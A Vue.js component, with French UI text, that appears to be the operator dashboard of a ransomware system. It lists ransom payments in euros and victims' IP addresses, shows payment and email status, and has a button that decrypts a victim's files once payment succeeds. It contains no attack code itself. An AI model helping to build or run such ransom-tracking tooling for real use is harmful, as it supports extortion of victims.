<template>
    <stat-card v-if="displayedPayments.length > 0">
        <table>
            <tr v-for="log in displayedPayments" class="paragraphe small">
                <td>
                    <span class="text-amber">{{ $moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
                </td>
                <td v-if="log.paymentStatus === 'payment_intent'">
                    rançon de <span class="text-danger">{{ log.amount }}&nbsp;€</span>
                </td>
                <td v-else>
                    paiement de <span class="text-danger">{{ log.amount }}&nbsp;€</span>
                </td>
                <td>
                    &nbsp;&nbsp;ip:&nbsp;<span class="text-success">{{ log.user.ip }}</span>
                </td>
                <td>
                    <FlashMessage
                        v-if="log.paymentStatus === 'payment_success'"
                        type="info"
                        className="btn-small dashboard medium"
                    >
                        <button class="flash-button" @click.prevent="$emit('clickHandler', log.id)">Décrypter les fichiers de l'utilisateur</button>
                    </FlashMessage>
                    <FlashMessage
                        v-else-if="log.paymentStatus === 'files_decrypted'"
                        type="success"
                        className="btn-small dashboard medium"
                        message="Transaction terminée"
                    />
                    <FlashMessage
                        v-else-if="log.paymentStatus === 'payment_intent'"
                        type="error"
                        className="btn-small dashboard medium"
                        message="En attente de paiement"
                    />
                    <FlashMessage
                        v-else-if="log.paymentStatus === 'email_sent'"
                        type="warning"
                        className="btn-small dashboard medium"
                        message="Email envoyé..."
                    />
                </td>
            </tr>
        </table>
        <Pagination
            :pages="pages"
            :page="page"
            @go-next="() => page++"
            @go-prev="() => page--"
        />
    </stat-card>
</template>

<script lang="ts">
import {defineComponent} from 'vue';
import StatCard from "./StatCard.vue";
import Pagination from "../Pagination.vue";
import FlashMessage from "../FlashMessage.vue";

export default defineComponent({
    name: "PaymentStat",
    components: {
        FlashMessage,
        Pagination,
        StatCard,
    },
    props: {
        payments: { type: Array, default: () => null }
    },
    data() {
        return {
            page: 1,
            itemPerPage: 8,
            pages: [] as Number[]
        }
    },
    methods: {
        paginate(): Array<any> {
            let page = this.page;
            let perPage = this.itemPerPage;
            let from = (page * perPage) - perPage;
            let to = (page * perPage);
            return this.payments.slice(from, to);
        },
        setPages(): void {
            let numberOfPages = Math.ceil(this.payments.length / this.itemPerPage);
            for (let index = 1; index <= numberOfPages; index++) {
                this.pages.push(index);
            }
        }
    },
    computed: {
        displayedPayments() {
            return this.paginate();
        }
    },
    created() {
        this.setPages();
    },
})
</script>

<style scoped>
</style>